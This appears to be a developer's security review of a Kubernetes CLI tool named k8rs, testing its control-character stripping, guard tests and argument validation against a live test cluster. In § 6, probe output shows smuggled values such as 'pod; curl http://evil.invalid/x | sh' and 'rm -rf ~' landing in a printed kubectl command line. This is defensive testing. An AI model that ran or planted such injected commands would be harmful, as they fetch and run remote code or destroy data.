# One transformation on a string — what the guards catch and what they do not

Operator review of Phase 6 family 3 (control-character stripping on every
free-text field; sanitising for the screen vs emitting for a consumer), against
the working tree at `1b72e51` + the uncommitted family diff.

**No cluster was created.** `kind get clusters` prints `k8rs` alone, before and
after. The PM's fixture cluster (`kind-k8rs`, `v1.36.1`, four nodes, 8 days old,
55 events in `default`) was read only; the single request that was not a read was
a **server dry-run** that the API server rejected and that persisted nothing —
`kubectl get crd --no-headers | wc -l` printed `1` (`No resources found`) before
and after it.

Everything was built and run **on this machine**, from two copies of the tree
outside the repo, each with its own `CARGO_TARGET_DIR`:

- `before/` — the working tree with `src/k8s.rs`, `src/main.rs`,
  `src/k8s_tests.rs`, `src/main_tests.rs` replaced by `git show HEAD:…`
- `after/` — the working tree as it stands

**Long output lines are folded in this file and are not folded by the tool.**
k8rs wraps nothing on any emit path; every fold below is this file's, added by
hand, and § 8 is where the unfolded byte counts are.

`/tmp` on this box is a 12 GiB tmpfs and the second release build filled it
(`rustc-LLVM ERROR: IO failure on output stream: No space left on device`,
D133's shape arriving in a hand build rather than in `cargo mutants`). Both trees
were moved under `$HOME` and rebuilt there.

---

## 1. The events refactor: `fn happening` → `impl From` + `ingest`

### 1a. Same bytes out of the same real cluster

```
$ before/k8rs --describe --object default/<pod>   >b.out 2>b.err
$ after/k8rs  --describe --object default/<pod>   >a.out 2>a.err
```

for `broken-image`, `broken-config`, `broken-pending`, `broken-hostpath`,
`broken-restarts10serving`:

```
before broken-image exit=0 / after broken-image exit=0
  IDENTICAL stdout+stderr (321 bytes)
before broken-config exit=0 / after broken-config exit=0
  IDENTICAL stdout+stderr (387 bytes)
before broken-pending exit=0 / after broken-pending exit=0
  IDENTICAL stdout+stderr (425 bytes)
before broken-hostpath exit=0 / after broken-hostpath exit=0
  IDENTICAL stdout+stderr (1076 bytes)
before broken-restarts10serving exit=0 / after broken-restarts10serving exit=0
  IDENTICAL stdout+stderr (81 bytes)
```

Nothing on this cluster reaches either bound, which is why 1b exists:

```
$ kubectl get events -A -o json | (message lengths)
events: 58
longest message bytes: 345
top5 (len, reason, count): [(345,'Failed',1274), (345,'Failed',1270),
                            (253,'FailedScheduling',1304), (145,'FailedCreate',1),
                            (145,'FailedCreate',1)]
any control char in a message: False
FREE_TEXT is 4096; over cap: 0
```

### 1b. Same bound at the boundary

One identical probe test appended to **both** trees, driving `k8s::events`
against the stub server with an oversize `message`, an oversize `reason` and a
poisoned pair. `cargo test review_probe_what_the_events_fetch_bounds -- --nocapture`:

```
BEFORE (HEAD product code)                 AFTER (working tree)
PROBE message sent=600  kept=600  shortened=false      identical
PROBE message sent=5000 kept=4119 shortened=true       identical
PROBE reason  sent=600  kept=535  shortened=true       identical
PROBE strip   reason="Unhealthy"                       identical
              message="line one line two[2J"
```

`4119 = FREE_TEXT(4096) + SHORTENED(23)`, `535 = IDENTIFIER(512) + 23`. The two
runs are byte-identical: the class of each field, the cut point, the marker and
the substitution are unchanged.

## 2. The `!Tag` arm

```
$ grep -n "non_exhaustive" ~/.cargo/registry/src/*/serde_yaml_ng-0.10.0/src/value/mod.rs
(no output)
```

`pub enum Value` at `value/mod.rs:26` carries no attribute — a new variant is a
build failure, as claimed.

Reachability is stronger than the diff's comment says, and does not depend on
what any server sends:

```
$ grep -n "visit_enum" .../serde_yaml_ng-0.10.0/src/value/de.rs
109:            fn visit_enum<A>(self, data: A) -> Result<Self::Value, A::Error>
115:                Ok(Value::Tagged(Box::new(TaggedValue { tag, value })))
$ sed -n '119p' .../serde_yaml_ng-0.10.0/src/value/de.rs
        deserializer.deserialize_any(ValueVisitor)

$ sed -n '281,291p' .../kube-client-4.2.0/src/client/mod.rs
    pub async fn request<T>(&self, request: Request<Vec<u8>>) -> Result<T>
        let text = self.request_text(request).await?;
        serde_json::from_str(&text).map_err(...)
```

`Tagged` is built only in `visit_enum`; `Value::deserialize` asks for
`deserialize_any`; the decoder on this path is **serde_json**, which never
answers `deserialize_any` with `visit_enum`. No product file parses YAML text:

```
$ grep -n "serde_yaml_ng::from_str" src/*.rs | grep -v _tests
(no output)
```

## 3. The derived field-list parser still goes silent on two shapes

`unqualified()` teaches the parser `pub(crate)`. Two shapes still return `None`
and are still skipped without a word.

**(a) another visibility.** A new text-carrying child type on `Happening`, filled
straight off the wire, with no `impl Bounded`:

```rust
pub(super) struct EventSource { pub(crate) component: String }
// Happening { …, source: EventSource }
```

```
$ cargo test every_string_an_events_fetch_keeps_is_named_by_the_ingest_guard -- --nocapture
bounded, off k8s.rs: Happening.reason · Happening.message
test result: ok. 1 passed; 0 failed
$ cargo test --bin k8rs
test result: ok. 846 passed; 0 failed
```

Control — the identical plant spelled `pub(crate)`:

```
$ cargo test every_string_an_events_fetch_keeps_is_named_by_the_ingest_guard
panicked at src/k8s_tests.rs:3372:17:
EventSource carries ["component"] and k8s.rs has no `impl Bounded` for it
test result: FAILED. 0 passed; 1 failed
```

**(b) a tuple struct.** `pub(crate) struct EventSource(pub(crate) String);`,
same field, same wire source:

```
$ cargo test --bin k8rs
test result: ok. 846 passed; 0 failed
```

Two tuple structs already exist in the product files:

```
$ grep -nE "^(pub(\([a-z:]*\))? )?(struct|enum) " src/rules.rs src/k8s.rs | grep -vE " \{$"
src/k8s.rs:5714:pub(crate) struct Document(serde_yaml_ng::Value);
src/k8s.rs:7754:struct StandingBackoff(watcher::DefaultBackoff);
```

Neither carries a `String` today, and there is no `pub(super)` anywhere in
`src/`, so nothing is currently unstripped.

## 4. The corpus sweep cannot tell that its key poison stopped working

Attack 1 — the `poison_every_key` call removed from
`no_captured_object_carries_an_unprintable_character_through_the_document_strip`:

```
92 captured objects swept, 18702 strings walked
test result: ok. 1 passed; 0 failed
```

Attack 2 — that, **and** `clean`'s `Mapping` arm reduced to cleaning only its
values (the exact state the author measured as blind):

```
92 captured objects swept, 18702 strings walked
test result: ok. 1 passed; 0 failed
```

The sweep's own *did I plant anything* assertion is
`found.iter().any(|held| held.starts_with("[2J"))`, and `poison()` is
`"\u{1b}[2J" + "P"×20000` — so every poisoned **value** satisfies it and the key
half is held by nothing.

The sibling guard does catch the product defect, which is why this is about the
sweep and not about `clean`:

```
$ cargo test clean_reaches_a_string_in_every_position   # key strip removed
panicked at src/k8s_tests.rs:15520:5:
clean did not reach every position a string can sit in: ["no\u{202e}te"]
test result: FAILED. 0 passed; 1 failed
```

## 5. The log-stream "door" guard reads one function, and the door is wider

```
$ grep -n "log_stream(\|read_lines(" src/k8s.rs src/main.rs | grep -v _tests
src/main.rs:3841:    let reader = match k8s::log_stream(&session.client, &request).await {
src/k8s.rs:5260:pub(crate) async fn log_stream(
src/main.rs:3871:        k8s::read_lines(reader, |line| {
src/main.rs:3888:        let read = k8s::read_lines(reader, |line| {
```

`log_stream` is `pub(crate)` and hands raw bytes back to `main.rs`. The
`--follow` arm rewritten to decode them itself, with the fetch arm left alone so
the guard's `handed.len() == 2` still holds:

```rust
use futures_util::{AsyncBufReadExt, StreamExt};
let mut lines = Box::pin(reader).lines();
loop { match lines.next().await.transpose() { Ok(Some(line)) => { … } … } }
```

```
$ cargo test
test result: ok. 845 passed; 0 failed
test result: ok. 23 passed; 0 failed
```

868 green with `--logs --follow` going through neither `text` (invariant 9), nor
the `FREE_TEXT` cut, nor `LINE_READ`'s per-line ceiling.

## 6. The one unvalidated cluster word on a `$ kubectl` line

`Fetch::table` refuses a kind whose **group, version, plural** (and namespace)
are not `path_safe`; `Browsable::kind` is checked by nothing, and
`yaml_run` builds `qualified` out of it. Probe against the real function:

```
PROBE Fetch::table built a path: Some("/api/v1/namespaces/default/pods")
PROBE command log line: $ kubectl get pod; curl http://evil.invalid/x | sh # web -n default -o yaml --show-managed-fields
PROBE failure sentence: the pod; curl http://evil.invalid/x | sh # web in default
PROBE with ESC:         $ kubectl get pod[2j; rm -rf ~ # web -n default -o yaml --show-managed-fields
```

(`sanitize` removed the `ESC` and left everything a shell reads.)

**A CRD cannot carry one** — server dry-run against the fixture cluster,
persisted nothing:

```
$ kubectl create --dry-run=server -f - <<< (a CRD with names.kind: "Widget; curl evil")
The CustomResourceDefinition "widgets.review.k8rs.test" is invalid:
spec.names.kind: Invalid value: "Widget; curl evil": may have mixed case, but
should otherwise match: a DNS-1035 label … regex used for validation is
'[a-z]([-a-z0-9]*[a-z0-9])?'
```

The residual source is an **aggregated API server**, and this cluster runs one:

```
$ kubectl get apiservices -o json | (those with spec.service)
aggregated apiservices: ['v1beta1.metrics.k8s.io']
total apiservices: 22
```

**Not measured:** whether kube-apiserver validates the `kind` word in an
extension server's discovery document. Naming it rather than claiming it.

The other two printed lines are closed at argv, and that is measured by reading
the predicates rather than guessed: `--object`'s name goes through
`k8s::object_name` (`path_safe` + 253), its namespace and `--namespace` through
`k8s::namespace_name` (DNS-1123 label + 63), `--container` through
`object_name`, and the kubeconfig's own namespace through `namespace_name` at
`in_namespace`.

## 7. `sanitize` is not a no-op on the live path

`main.rs`'s new doc says *"On the live path this is a provable no-op"*. The
binary, against argv only:

```
$ k8rs $'x\e[2Jy‮z.json'
k8rs: x[2Jyz.json: No such file or directory (os error 2)

$ k8rs --once $'--fo\e[2Jo'
k8rs: --fo[2Jo is not a flag k8rs has

$ k8rs --once --namespace $'PAY\e[2JMENTS'
k8rs: --namespace needs the name of a namespace, and PAY[2JMENTS (with what
cannot print removed) is not one — a namespace is lowercase letters, digits and
dashes, up to 63 characters
```

The `ESC` and the `U+202E` were removed by `sanitize` and by nothing else, on the
cluster path as much as the file path. `k8s::text` never saw them: argv is not an
API object.

The test that measures the claim feeds only strings that went through `text`, so
it is true of what it fed and narrower than the sentence above it:

```
18717 strings through `text` and then `sanitize`; 0 of them changed
```

## 8. What `--yaml` prints against what its `kubectl` line prints

Same object, real cluster, both redirected to a file:

```
$ k8rs --yaml --kind configmaps --object kube-system/coredns
$ kubectl describe … (the line k8rs printed on stderr:)
$ kubectl get configmap coredns -n kube-system -o yaml --show-managed-fields
k8rs lines: 43   kubectl lines: 43
same object (parsed): False
```

Every key and every value is present in both and nothing is missing in either
direction. The two differences are the printer's:

```
k8rs top-level key order:     kind, apiVersion, metadata, data
kubectl top-level key order:  apiVersion, data, kind, metadata

k8rs metadata key order:      name, namespace, uid, resourceVersion,
                              creationTimestamp, managedFields
kubectl metadata key order:   creationTimestamp, managedFields, name,
                              namespace, resourceVersion, uid

k8rs   : creationTimestamp: 2026-08-22T15:50:23Z
kubectl: creationTimestamp: "2026-08-22T15:50:23Z"
```

`kubectl get -o yaml` **alphabetises**; k8rs keeps the API's order. The document
path's own `\n` retention holds end to end on a real object: the `Corefile` value
came back with 23 newlines in it and 43 lines were printed, against `kubectl`'s
43.

## 9. `Happened::cut` at the page boundary

`cut` is `metadata.continue_.is_some()`. `broken-image` has 4 events; `default`
has 55:

```
$ kubectl get --raw '/api/v1/namespaces/default/events?fieldSelector=involvedObject.kind%3DPod%2CinvolvedObject.name%3Dbroken-image&limit=N'
limit=2   items=2  continue=yes  remainingItemCount=None
limit=4   items=4  continue=yes  remainingItemCount=None
limit=6   items=4  continue=no   remainingItemCount=None
limit=10  items=4  continue=no   remainingItemCount=None
limit=60  items=4  continue=no   remainingItemCount=None
```

A continue token is emitted when the page **exactly fills** the limit and the
underlying collection has more keys, whether or not any of those keys match.
`limit=6` returning no token also shows the server scanning to the end of the
collection to prove there is nothing more — the read is bounded in what k8rs
*holds*, not in what the server *walks*. `kubectl describe` sends the same
selector with no limit at all.

## 10. Refusal and failure

Same cluster, three kubeconfigs. Exit codes read without a pipe.

```
$ KUBECONFIG=<no credential> k8rs --describe --object default/broken-image
k8rs: the role this kubeconfig uses needs to get the pod broken-image in default
exit=2

$ KUBECONFIG=<no credential> k8rs --yaml --object default/broken-image
k8rs: this cluster would not say what kinds it serves, so k8rs cannot tell which
one --kind means — the role this kubeconfig uses needs to `get /apis`

$ KUBECONFIG=<no credential> k8rs --once
k8rs: watching — server v1.36.1 · could not list what this cluster serves, so
k8rs cannot show you what is in it or tell which add-ons it has (the role this
kubeconfig uses needs to `get /apis`)
k8rs: this cluster did not show k8rs its pods, and every finding starts there,
so there is nothing to report

  What k8rs asked for: pods in the namespace default
  What happened: the role this kubeconfig uses needs to `list` and `watch` pods

  This kubeconfig names no namespace, so k8rs had to guess default and was
  refused there too. Say which namespace you work in: --namespace <name>

$ KUBECONFIG=<server https://127.0.0.1:1> k8rs --describe --object default/web
k8rs: nothing usable came back when k8rs tried to get the pod web in default
exit=2

$ k8rs --describe --object default/broken-image --context no-such-context
k8rs: no cluster to watch — this kubeconfig has no such context — check the
`--context` you gave, or the `current-context` line in the file
exit=2
```

Each 403 degrades one feature, names the verb and the resource, and the
`nonResourceURL` refusal names the path. No retry loop, no panic.

## 11. `insecure-skip-tls-verify` on a shipped surface

A kubeconfig identical to the working one but with the CA dropped and
`insecure-skip-tls-verify: true` set (written 0600, deleted after the run):

```
$ KUBECONFIG=<insecure> k8rs --once | head -2
k8rs: watching — server v1.36.1 · 62 kinds · {Metrics, DisruptionBudgets}
41 pods · 4 nodes

$ k8rs --once | head -2                      # the ordinary kubeconfig
k8rs: watching — server v1.36.1 · 62 kinds · {Metrics, DisruptionBudgets}
41 pods · 4 nodes
```

Byte-identical. The flag is read and carried on `Choice::insecure`, which only a
Phase 11 picker row draws:

```
$ grep -rn "\.insecure\b" src/*.rs | grep -v _tests
(no output — nothing reads it in this build)
$ grep -n "insecure" docs/security.md
228:  `insecure-skip-tls-verify` is still honoured and still shown in the header.
```

## 12. What a reader sees

```
$ k8rs --describe --object default/broken-hostpath
$ kubectl describe pod broken-hostpath -n default
Pod · running · created 8 days ago

containers:
  nosy      running, 136 restarts
  shipper   running, 136 restarts

events (newest first):
  45 min ago  the image is ready
    (Pulled) Successfully pulled image "busybox" in 941ms (941ms including
             waiting). Image size: 2236931 bytes.
    happened 2 times since 4 days ago
  45 min ago
    (Started) Container started
    happened 113 times since 4 days ago
  …
exit=0
```

The busiest object in the cluster carries 8 distinct events against
`EVENTS_KEPT = 500`.

## Not measured

- Whether kube-apiserver validates an aggregated API server's discovery `kind`
  (§ 6).
- Secret masking on `--yaml`: this cluster serves no Secret objects
  (`kubectl get secrets -A` → `No resources found`), so the redaction path was
  not exercised. It needs one object created.

## Cleanup

No cluster was created or deleted. `kubectl get crd` count unchanged. The two
build trees, the three throwaway kubeconfigs and both binaries live under
`~/.cache/`, outside the repo and outside `/tmp`; the copy that held a real
credential was deleted at the end of the run. `git status --short` in the repo
lists the same four modified files it listed at the start of the review.
